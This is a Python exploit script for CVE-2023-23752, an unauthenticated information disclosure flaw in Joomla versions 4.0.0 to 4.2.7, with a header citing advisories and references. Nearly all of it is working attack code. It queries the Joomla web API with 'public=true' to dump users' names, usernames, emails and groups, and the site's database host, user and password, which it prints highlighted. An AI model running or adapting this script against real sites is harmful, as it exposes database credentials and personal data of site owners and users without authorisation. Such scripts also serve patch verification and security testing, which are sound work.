#!/usr/bin/env python

# Exploit
## Title: Joomla! < 4.2.8 - Unauthenticated information disclosure
## Exploit author: 0xNahim (Nahim Diaz)
## Exploit source: https://github.com/
## Date: 2023-03-26
## Vendor Homepage: https://www.joomla.org/
## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
## Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
## Tested on: Joomla! Version 4.2.7
## CVE : CVE-2023-23752

# Vulnerability
## Discoverer: Zewei Zhang from NSFOCUS TIANJI Lab
## Date: 2023-02-24
## Discoverer website: https://nsfocusglobal.com/company-overview/nsfocus-security-labs/
## Title: Joomla Unauthorized Access
## CVE: CVE-2023-23752
## Patch: Update to >= 4.2.8
## References:
##   - https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/
##   - https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
##   - https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752
##   - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
##   - https://vulncheck.com/blog/joomla-for-rce
##   - https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml

# standard library
import requests
import argparse
import json
from termcolor import colored

## Functions
def obtener_usuarios(url):
    r = requests.get(f"{url}/api/index.php/v1/users?public=true")
    data = json.loads(r.content)['data']
    users = []
    for user in data:
        if user['type'] == 'users':
            id = user['attributes']['id']
            name = user['attributes']['name']
            username = user['attributes']['username']
            email = user['attributes']['email']
            groups = user['attributes']['group_names']
            users.append({'id': id, 'name': name, 'username': username, 'email': email, 'groups': groups})
    return users

def imp_users(url):
    r = requests.get(f"{url}/api/index.php/v1/users?public=true")
    if r.status_code == 200:
       users = obtener_usuarios(url)
       for u in users:
           print("[{}] {} ({}) - {} - {}".format(u['id'], u['name'], colored(u['username'], 'yellow'), u['email'], u['groups']))
    else:
        print("El sitio web no es vulnerable")
        exit()

def obtener_config(url):
    r = requests.get(f"{url}/api/index.php/v1/config/application?public=true")
    data = json.loads(r.content)["data"]
    config = {}
    for entry in data:
        if entry['type'] == 'application':
            key = list(entry['attributes'].keys())[0]
            config[key] = entry['attributes'][key]
    return config

def imp_config(url):
    c = obtener_config(url)
    print(colored('Site info', 'red', attrs=['bold']))
    print(f"Sitename:{c['sitename']}")
    print(f"Editor: {c['editor']}")
    print(f"Captcha: {c['captcha']}")
    print(f"Access: {c['access']}")
    print(f"Debug status: {c['debug']}")
    print()
    print(colored('Database info', 'red', attrs=['bold']))
    print(f"DB type: {c['dbtype']}")
    print(f"DB host: {c['host']}")
    print(f"DB user: {colored(c['user'], 'yellow', attrs=['bold'])}")
    print(f"DB password: {colored(c['password'], 'yellow', attrs=['bold'])}")
    print(f"DB name: {c['db']}")
    print(f"DB prefix: {c['dbprefix']}")
    print(f"DB encryption: {c['dbencryption']}")

## parse argument
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", action="store", help="Target url, http://localhost:8080/", default=False, required=True)
args = parser.parse_args()

if __name__ == "__main__":
    r = requests.get(args.url)
    if r.status_code == 200:
        imp_users(args.url)
        imp_config(args.url)
    else:
        print("El sitio está caido o es imposible acceder a él")
